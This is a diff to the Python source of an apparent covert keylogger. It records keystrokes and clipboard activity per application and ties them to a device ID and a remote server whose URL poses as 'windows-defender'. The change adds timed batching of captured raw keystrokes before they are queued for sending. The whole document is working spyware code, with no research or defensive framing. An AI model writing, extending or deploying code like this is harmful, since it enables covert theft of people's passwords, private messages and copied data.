@@ -8,7 +8,7 @@ import sys
 import ctypes
 from ctypes import wintypes
 from queue import Queue
-from threading import Lock, Thread
+from threading import Lock, Thread, Timer
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 
@@ -19,12 +19,16 @@ except ImportError:
     Desktop = None
 
 MESSAGE_GAP_MS = 2500
+RAW_BATCH_DELAY_SECONDS = 0.08
 HEARTBEAT_INTERVAL_SECONDS = 30
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
 raw_message_buffer = ""
+raw_log_buffer = ""
+raw_log_target = None
+raw_flush_timer = None
 last_key_time_ms = None
 message_started_ms = None
 active_target = None
@@ -159,7 +163,7 @@ def raw_key_value(key):
     if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
         return "[CMD]"
     if key == Key.space:
-        return " "
+        return "[SPACE]"
     if key == Key.enter:
         return "[ENTER]"
     if key == Key.tab:
@@ -260,6 +264,29 @@ def message_sender():
         message_queue.task_done()
 
 
+def queue_raw_token(token, app_name):
+    global raw_log_buffer, raw_log_target, raw_flush_timer
+    raw_log_buffer += token
+    if raw_log_target is None:
+        raw_log_target = app_name
+    if raw_flush_timer is None:
+        raw_flush_timer = Timer(RAW_BATCH_DELAY_SECONDS, flush_raw_log)
+        raw_flush_timer.daemon = True
+        raw_flush_timer.start()
+
+
+def flush_raw_log():
+    global raw_log_buffer, raw_log_target, raw_flush_timer
+    with state_lock:
+        raw_text = raw_log_buffer
+        app_name = raw_log_target or get_active_app()
+        raw_log_buffer = ""
+        raw_log_target = None
+        raw_flush_timer = None
+        if raw_text:
+            message_queue.put((raw_text, app_name, raw_text, False, False, True))
+
+
 def queue_copied_clipboard(target):
     time.sleep(0.1)
     copied_text = get_clipboard_text().strip()
@@ -295,14 +322,14 @@ def on_press(key):
             active_modifiers.add(modifier_aliases.get(key, key))
             raw_token = raw_key_value(key)
             raw_message_buffer += raw_token
-            message_queue.put((raw_token, get_active_app(), raw_token, False, False, True))
+            queue_raw_token(raw_token, get_active_app())
             return
 
         key_char = (key.char or "") if isinstance(key, KeyCode) else ""
         raw_symbol = raw_key_value(key)
         if raw_symbol:
             raw_message_buffer += raw_symbol
-            message_queue.put((raw_symbol, get_active_app(), raw_symbol, False, False, True))
+            queue_raw_token(raw_symbol, get_active_app())
         is_paste_key = key_char.lower() == "v" or key_char == "\x16"
         is_copy_key = key_char.lower() == "c" or key_char == "\x03"
         if is_copy_key and Key.ctrl in active_modifiers:
